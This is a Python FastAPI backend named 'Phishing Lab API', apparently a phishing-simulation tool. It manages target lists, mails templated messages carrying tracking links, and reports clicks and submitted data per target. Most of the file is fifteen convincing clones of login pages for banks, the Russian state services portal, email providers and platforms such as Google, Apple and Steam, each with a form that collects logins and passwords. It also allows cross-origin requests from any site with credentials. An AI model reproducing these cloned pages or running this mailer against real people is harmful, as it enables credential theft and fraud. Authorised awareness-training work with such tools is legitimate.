import uuid
from typing import Any, Optional

import aiosmtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, RedirectResponse
from pydantic import BaseModel
from pydantic_settings import BaseSettings
from sqlalchemy import Column, ForeignKey, Integer, String, Text, select, update
from sqlalchemy.dialects.postgresql import JSONB, UUID
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine
from sqlalchemy.orm import DeclarativeBase


# ---------------------------------------------------------------------------
# Settings
# ---------------------------------------------------------------------------

class Settings(BaseSettings):
    database_url: str = "postgresql+asyncpg://phish:phish_secret@db:5432/phishdb"
    smtp_host: str = "mailpit"
    smtp_port: int = 1025
    base_url: str = "http://localhost:8000"

    class Config:
        env_file = ".env"


settings = Settings()

engine = create_async_engine(settings.database_url, echo=False)
AsyncSessionLocal = async_sessionmaker(engine, expire_on_commit=False)


# ---------------------------------------------------------------------------
# SQLAlchemy Models
# ---------------------------------------------------------------------------

class Base(DeclarativeBase):
    pass


class Target(Base):
    __tablename__ = "targets"

    id = Column(Integer, primary_key=True)
    last_name = Column(String(100), nullable=False)
    first_name = Column(String(100), nullable=False)
    patronymic = Column(String(100), nullable=True)
    email = Column(String(255), unique=True, nullable=False)


class Template(Base):
    __tablename__ = "templates"

    id = Column(Integer, primary_key=True)
    name = Column(String(255), nullable=False)
    html_content = Column(Text, nullable=False)


class Campaign(Base):
    __tablename__ = "campaigns"

    id = Column(Integer, primary_key=True)
    name = Column(String(255), nullable=False)
    sender_name = Column(String(255), nullable=False)
    sender_email = Column(String(255), nullable=False)
    template_id = Column(Integer, ForeignKey("templates.id"), nullable=False)
    landing_slug = Column(String(50), default="vk")
    status = Column(String(50), default="draft")


class CampaignTarget(Base):
    __tablename__ = "campaign_targets"

    campaign_id = Column(Integer, ForeignKey("campaigns.id"), primary_key=True)
    target_id = Column(Integer, ForeignKey("targets.id"), primary_key=True)
    tracking_token = Column(
        UUID(as_uuid=True), default=uuid.uuid4, unique=True, index=True
    )
    status = Column(String(50), default="sent")
    submitted_data = Column(JSONB, nullable=True)


# ---------------------------------------------------------------------------
# Landing Redirects
# ---------------------------------------------------------------------------

LANDING_REDIRECTS = {
    "vk": "https://vk.com",
    "mailru": "https://mail.ru",
    "google": "https://google.com",
    "sberbank": "https://sberbank.ru",
    "gosuslugi": "https://gosuslugi.ru",
    "tinkoff": "https://tinkoff.ru",
    "microsoft": "https://microsoft.com",
    "steam": "https://store.steampowered.com",
    "telegram": "https://web.telegram.org",
    "instagram": "https://instagram.com",
    "avito": "https://avito.ru",
    "hh": "https://hh.ru",
    "yandex": "https://ya.ru",
    "apple": "https://apple.com",
    "amazon": "https://amazon.com",
}


# ---------------------------------------------------------------------------
# Landing Page Templates
# ---------------------------------------------------------------------------

LANDING_TEMPLATES: dict[str, str] = {}

LANDING_TEMPLATES["vk"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>VK | Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#e8ecf0;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:32px;font-weight:700;color:#5181b8;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:10px 12px;border:1px solid #d3d9de;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:10px;background:#5181b8;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#4a76a8}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#939cb0}
</style></head>
<body><div class="card">
  <div class="logo">VK</div>
  <h2>Вход в аккаунт</h2>
  <form method="POST">
    <input name="login" placeholder="Телефон или email" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© VK 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["mailru"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mail.ru — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f2f3f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:28px;font-weight:700;color:#005ff9;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:10px 12px;border:1px solid #d3d9de;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:10px;background:#005ff9;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#0050d6}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#939cb0}
</style></head>
<body><div class="card">
  <div class="logo">Mail.ru</div>
  <h2>Вход в почту</h2>
  <form method="POST">
    <input name="login" placeholder="Имя аккаунта" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Mail.ru Group</div>
</div></body></html>
"""

LANDING_TEMPLATES["google"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google — Вход</title>
<style>
  body{margin:0;font-family:'Segoe UI',Roboto,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:340px}
  .logo{text-align:center;font-size:28px;font-weight:500;margin-bottom:8px}
  .logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
  h2{text-align:center;margin:0 0 4px;font-size:22px;color:#202124;font-weight:400}
  .sub{text-align:center;font-size:14px;color:#5f6368;margin-bottom:24px}
  input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box;margin-bottom:16px}
  button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}
  button:hover{background:#1765cc}
  .footer{text-align:center;margin-top:20px;font-size:12px;color:#5f6368}
</style></head>
<body><div class="card">
  <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
  <h2>Вход</h2>
  <p class="sub">Используйте аккаунт Google</p>
  <form method="POST">
    <input name="login" placeholder="Телефон или адрес эл. почты" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Далее</button>
  </form>
  <div class="footer">© Google 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["sberbank"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Сбербанк Онлайн — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f4f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:16px;padding:40px;width:340px;box-shadow:0 4px 16px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:24px;font-weight:700;color:#21a038;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#21a038;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#1c8c30}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">Сбербанк Онлайн</div>
  <h2>Вход в систему</h2>
  <form method="POST">
    <input name="login" placeholder="Логин" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© ПАО Сбербанк, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["gosuslugi"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Госуслуги — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f2f3f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:22px;font-weight:700;color:#0d4cd3;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:12px;border:1px solid #d0d5dd;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#0d4cd3;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#0b3fb5}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">Госуслуги</div>
  <h2>Вход в личный кабинет</h2>
  <form method="POST">
    <input name="login" placeholder="Телефон / Email / СНИЛС" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Госуслуги, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["tinkoff"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Тинькофф — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:16px;padding:40px;width:340px;box-shadow:0 4px 16px rgba(0,0,0,.06)}
  .logo{text-align:center;font-size:26px;font-weight:700;color:#333;margin-bottom:24px}
  .logo span{background:#ffdd2d;padding:2px 8px;border-radius:6px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:12px;border:1px solid #d0d5dd;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#ffdd2d;color:#333;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#ffd319}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo"><span>Т</span> Тинькофф</div>
  <h2>Вход в личный кабинет</h2>
  <form method="POST">
    <input name="login" placeholder="Телефон или номер договора" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Тинькофф Банк, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["microsoft"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft — Вход</title>
<style>
  body{margin:0;font-family:'Segoe UI',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;padding:44px;width:340px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
  .logo{font-size:22px;font-weight:600;color:#5e5e5e;margin-bottom:16px}
  .logo span{font-size:20px;margin-right:8px}
  h2{margin:0 0 24px;font-size:20px;color:#1b1b1b;font-weight:400}
  input{width:100%;padding:8px 4px;border:none;border-bottom:1px solid #666;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none}
  input:focus{border-bottom-color:#0078d4}
  button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer}
  button:hover{background:#006cbe}
  .footer{margin-top:20px;font-size:12px;color:#666}
</style></head>
<body><div class="card">
  <div class="logo"><span>&#9638;</span> Microsoft</div>
  <h2>Вход</h2>
  <form method="POST">
    <input name="login" placeholder="Email, телефон или Skype" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Microsoft 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["steam"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Steam — Вход</title>
<style>
  body{margin:0;font-family:Arial,sans-serif;background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#171a21;border-radius:4px;padding:40px;width:340px;box-shadow:0 0 12px rgba(0,0,0,.5)}
  .logo{text-align:center;font-size:28px;font-weight:700;color:#fff;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:16px;color:#b8b6b4}
  label{display:block;font-size:12px;color:#b8b6b4;margin-bottom:4px;text-transform:uppercase}
  input{width:100%;padding:8px;background:#32353c;border:1px solid #32353c;border-radius:3px;color:#fff;font-size:14px;box-sizing:border-box;margin-bottom:16px}
  button{width:100%;padding:10px;background:#5c7e10;color:#d2efa9;border:none;border-radius:3px;font-size:15px;cursor:pointer}
  button:hover{background:#6b8e1a}
  .footer{text-align:center;margin-top:16px;font-size:11px;color:#666}
</style></head>
<body><div class="card">
  <div class="logo">STEAM</div>
  <h2>Вход в аккаунт</h2>
  <form method="POST">
    <label>Имя аккаунта</label>
    <input name="login" required>
    <label>Пароль</label>
    <input name="password" type="password" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Valve Corporation</div>
</div></body></html>
"""

LANDING_TEMPLATES["telegram"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Telegram — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
  .logo{text-align:center;font-size:48px;margin-bottom:12px;color:#2AABEE}
  h2{text-align:center;margin:0 0 8px;font-size:20px;color:#222}
  .sub{text-align:center;font-size:14px;color:#888;margin-bottom:24px}
  input{width:100%;padding:12px;border:1px solid #d0d5dd;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#2AABEE;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#229ed9}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">&#9993;</div>
  <h2>Telegram</h2>
  <p class="sub">Войдите в свой аккаунт</p>
  <form method="POST">
    <input name="login" placeholder="Номер телефона" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Telegram 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["instagram"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px;width:300px}
  .logo{text-align:center;font-size:36px;font-weight:400;font-family:'Segoe Script','Brush Script MT',cursive;margin-bottom:24px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  input{width:100%;padding:10px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:13px;box-sizing:border-box;margin-bottom:8px}
  button{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
  button:hover{background:#1877f2}
  .sep{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px}
  .sep::before,.sep::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
  .sep span{padding:0 16px}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#8e8e8e}
</style></head>
<body><div class="card">
  <div class="logo">Instagram</div>
  <form method="POST">
    <input name="login" placeholder="Телефон, имя пользователя или эл. адрес" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="sep"><span>ИЛИ</span></div>
  <div class="footer">© Instagram 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["avito"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Авито — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
  .logo{text-align:center;font-size:28px;font-weight:700;color:#00aaff;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#97cf26;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#88bb20}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">Авито</div>
  <h2>Вход в аккаунт</h2>
  <form method="POST">
    <input name="login" placeholder="Телефон или email" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Авито, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["hh"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>hh.ru — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;padding:40px;width:340px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
  .logo{text-align:center;font-size:28px;font-weight:700;color:#d6001c;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#333}
  input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#d6001c;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#b8001a}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">hh.ru</div>
  <h2>Вход на сайт</h2>
  <form method="POST">
    <input name="login" placeholder="Email" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© HeadHunter, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["yandex"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Яндекс — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:16px;padding:40px;width:340px;box-shadow:0 4px 24px rgba(0,0,0,.1)}
  .logo{text-align:center;font-size:32px;font-weight:700;color:#fc3f1d;margin-bottom:24px}
  h2{text-align:center;margin:0 0 24px;font-size:18px;color:#000}
  input{width:100%;padding:12px;border:1px solid #ccc;border-radius:10px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#fc3f1d;color:#fff;border:none;border-radius:10px;font-size:15px;cursor:pointer}
  button:hover{background:#e53510}
  .footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head>
<body><div class="card">
  <div class="logo">Яндекс</div>
  <h2>Войдите с Яндекс ID</h2>
  <form method="POST">
    <input name="login" placeholder="Логин или email" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Яндекс, 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["apple"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Apple ID — Вход</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{padding:40px;width:340px}
  .logo{text-align:center;font-size:48px;color:#333;margin-bottom:12px}
  h2{text-align:center;margin:0 0 4px;font-size:22px;color:#1d1d1f;font-weight:600}
  .sub{text-align:center;font-size:14px;color:#6e6e73;margin-bottom:28px}
  input{width:100%;padding:12px;border:1px solid #d2d2d7;border-radius:8px;font-size:15px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:12px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer}
  button:hover{background:#0060c0}
  .footer{text-align:center;margin-top:24px;font-size:12px;color:#86868b}
</style></head>
<body><div class="card">
  <div class="logo">&#63743;</div>
  <h2>Вход с Apple ID</h2>
  <p class="sub">Используйте Apple ID для входа</p>
  <form method="POST">
    <input name="login" placeholder="Apple ID (email)" required>
    <input name="password" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Apple Inc., 2024</div>
</div></body></html>
"""

LANDING_TEMPLATES["amazon"] = """
<!DOCTYPE html>
<html lang="ru">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Amazon — Вход</title>
<style>
  body{margin:0;font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border:1px solid #ddd;border-radius:8px;padding:28px;width:320px}
  .logo{text-align:center;font-size:28px;font-weight:700;color:#111;margin-bottom:20px}
  .logo span{color:#ff9900}
  h2{margin:0 0 20px;font-size:20px;color:#111}
  label{display:block;font-size:13px;font-weight:700;color:#111;margin-bottom:4px}
  input{width:100%;padding:8px;border:1px solid #a6a6a6;border-radius:4px;font-size:14px;box-sizing:border-box;margin-bottom:12px}
  button{width:100%;padding:8px;background:#ffd814;color:#111;border:1px solid #fcd200;border-radius:8px;font-size:14px;cursor:pointer}
  button:hover{background:#f7ca00}
  .footer{text-align:center;margin-top:16px;font-size:11px;color:#555}
</style></head>
<body><div class="card">
  <div class="logo">amazon<span>.</span></div>
  <h2>Вход</h2>
  <form method="POST">
    <label>Email или телефон</label>
    <input name="login" required>
    <label>Пароль</label>
    <input name="password" type="password" required>
    <button type="submit">Войти</button>
  </form>
  <div class="footer">© Amazon.com, 2024</div>
</div></body></html>
"""


# ---------------------------------------------------------------------------
# FastAPI App
# ---------------------------------------------------------------------------

app = FastAPI(title="Phishing Lab API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
    allow_credentials=True,
    expose_headers=["*"],
)


@app.on_event("startup")
async def startup():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


# ---------------------------------------------------------------------------
# Pydantic Schemas
# ---------------------------------------------------------------------------

class TargetCreate(BaseModel):
    last_name: str
    first_name: str
    patronymic: Optional[str] = None
    email: str


class TargetOut(TargetCreate):
    id: int
    model_config = {"from_attributes": True}


class TemplateCreate(BaseModel):
    name: str
    html_content: str


class TemplateOut(TemplateCreate):
    id: int
    model_config = {"from_attributes": True}


class CampaignCreate(BaseModel):
    name: str
    sender_name: str
    sender_email: str
    template_id: int
    landing_slug: str = "vk"
    target_ids: list[int]


class CampaignOut(BaseModel):
    id: int
    name: str
    sender_name: str
    sender_email: str
    template_id: int
    landing_slug: str
    status: str
    model_config = {"from_attributes": True}


class CampaignTargetStats(BaseModel):
    target_id: int
    email: str
    full_name: str
    tracking_token: str
    status: str
    submitted_data: Optional[Any] = None


class CampaignReport(BaseModel):
    campaign: CampaignOut
    stats: list[CampaignTargetStats]
    total: int
    sent: int
    clicked: int
    submitted: int


# ---------------------------------------------------------------------------
# CRUD — Targets
# ---------------------------------------------------------------------------

@app.post("/api/targets", response_model=TargetOut)
async def create_target(data: TargetCreate):
    async with AsyncSessionLocal() as session:
        target = Target(**data.model_dump())
        session.add(target)
        await session.commit()
        await session.refresh(target)
        return target


@app.get("/api/targets", response_model=list[TargetOut])
async def list_targets():
    async with AsyncSessionLocal() as session:
        result = await session.execute(select(Target))
        return result.scalars().all()


@app.put("/api/targets/{target_id}", response_model=TargetOut)
async def update_target(target_id: int, data: TargetCreate):
    async with AsyncSessionLocal() as session:
        target = await session.get(Target, target_id)
        if not target:
            raise HTTPException(status_code=404, detail="Target not found")
        for key, value in data.model_dump().items():
            setattr(target, key, value)
        await session.commit()
        await session.refresh(target)
        return target


@app.delete("/api/targets/{target_id}")
async def delete_target(target_id: int):
    async with AsyncSessionLocal() as session:
        target = await session.get(Target, target_id)
        if not target:
            raise HTTPException(status_code=404, detail="Target not found")
        await session.delete(target)
        await session.commit()
        return {"ok": True}


# ---------------------------------------------------------------------------
# CRUD — Templates
# ---------------------------------------------------------------------------

@app.post("/api/templates", response_model=TemplateOut)
async def create_template(data: TemplateCreate):
    async with AsyncSessionLocal() as session:
        template = Template(**data.model_dump())
        session.add(template)
        await session.commit()
        await session.refresh(template)
        return template


@app.get("/api/templates", response_model=list[TemplateOut])
async def list_templates():
    async with AsyncSessionLocal() as session:
        result = await session.execute(select(Template))
        return result.scalars().all()


@app.put("/api/templates/{template_id}", response_model=TemplateOut)
async def update_template(template_id: int, data: TemplateCreate):
    async with AsyncSessionLocal() as session:
        template = await session.get(Template, template_id)
        if not template:
            raise HTTPException(status_code=404, detail="Template not found")
        for key, value in data.model_dump().items():
            setattr(template, key, value)
        await session.commit()
        await session.refresh(template)
        return template


@app.delete("/api/templates/{template_id}")
async def delete_template(template_id: int):
    async with AsyncSessionLocal() as session:
        template = await session.get(Template, template_id)
        if not template:
            raise HTTPException(status_code=404, detail="Template not found")
        await session.delete(template)
        await session.commit()
        return {"ok": True}


# ---------------------------------------------------------------------------
# Landings
# ---------------------------------------------------------------------------

LANDING_NAMES = {
    "vk": "ВКонтакте",
    "mailru": "Mail.ru",
    "google": "Google",
    "sberbank": "Сбербанк",
    "gosuslugi": "Госуслуги",
    "tinkoff": "Тинькофф",
    "microsoft": "Microsoft",
    "steam": "Steam",
    "telegram": "Telegram",
    "instagram": "Instagram",
    "avito": "Авито",
    "hh": "HeadHunter",
    "yandex": "Яндекс",
    "apple": "Apple",
    "amazon": "Amazon",
}


@app.get("/api/landings")
async def list_landings():
    return [
        {"slug": slug, "name": name}
        for slug, name in LANDING_NAMES.items()
    ]


# ---------------------------------------------------------------------------
# Campaigns
# ---------------------------------------------------------------------------

@app.post("/api/campaigns", response_model=CampaignOut)
async def create_campaign(data: CampaignCreate):
    async with AsyncSessionLocal() as session:
        template = await session.get(Template, data.template_id)
        if not template:
            raise HTTPException(status_code=404, detail="Template not found")

        campaign = Campaign(
            name=data.name,
            sender_name=data.sender_name,
            sender_email=data.sender_email,
            template_id=data.template_id,
            landing_slug=data.landing_slug,
            status="sent",
        )
        session.add(campaign)
        await session.flush()

        targets_result = await session.execute(
            select(Target).where(Target.id.in_(data.target_ids))
        )
        targets = targets_result.scalars().all()

        for target in targets:
            token = uuid.uuid4()
            ct = CampaignTarget(
                campaign_id=campaign.id,
                target_id=target.id,
                tracking_token=token,
                status="sent",
            )
            session.add(ct)

            phishing_link = f"{settings.base_url}/track/click/{token}"
            html_body = template.html_content
            html_body = html_body.replace("{{first_name}}", target.first_name)
            html_body = html_body.replace("{{last_name}}", target.last_name)
            html_body = html_body.replace(
                "{{patronymic}}", target.patronymic or ""
            )
            html_body = html_body.replace("{{phishing_link}}", phishing_link)

            msg = MIMEMultipart("alternative")
            msg["From"] = f"{data.sender_name} <{data.sender_email}>"
            msg["To"] = target.email
            msg["Subject"] = data.name
            msg.attach(MIMEText(html_body, "html"))

            try:
                await aiosmtplib.send(
                    msg,
                    hostname=settings.smtp_host,
                    port=settings.smtp_port,
                )
            except Exception:
                pass

        await session.commit()
        await session.refresh(campaign)
        return campaign


@app.get("/api/campaigns", response_model=list[CampaignOut])
async def list_campaigns():
    async with AsyncSessionLocal() as session:
        result = await session.execute(select(Campaign))
        return result.scalars().all()


@app.get("/api/campaigns/{campaign_id}/report", response_model=CampaignReport)
async def campaign_report(campaign_id: int):
    async with AsyncSessionLocal() as session:
        campaign = await session.get(Campaign, campaign_id)
        if not campaign:
            raise HTTPException(status_code=404, detail="Campaign not found")

        result = await session.execute(
            select(CampaignTarget, Target)
            .join(Target, CampaignTarget.target_id == Target.id)
            .where(CampaignTarget.campaign_id == campaign_id)
        )
        rows = result.all()

        stats = []
        sent = clicked = submitted = 0
        for ct, target in rows:
            full_name = f"{target.last_name} {target.first_name}"
            if target.patronymic:
                full_name += f" {target.patronymic}"
            stats.append(
                CampaignTargetStats(
                    target_id=target.id,
                    email=target.email,
                    full_name=full_name,
                    tracking_token=str(ct.tracking_token),
                    status=ct.status,
                    submitted_data=ct.submitted_data,
                )
            )
            if ct.status in ("sent", "clicked", "submitted"):
                sent += 1
            if ct.status in ("clicked", "submitted"):
                clicked += 1
            if ct.status == "submitted":
                submitted += 1

        return CampaignReport(
            campaign=campaign,
            stats=stats,
            total=len(rows),
            sent=sent,
            clicked=clicked,
            submitted=submitted,
        )


# ---------------------------------------------------------------------------
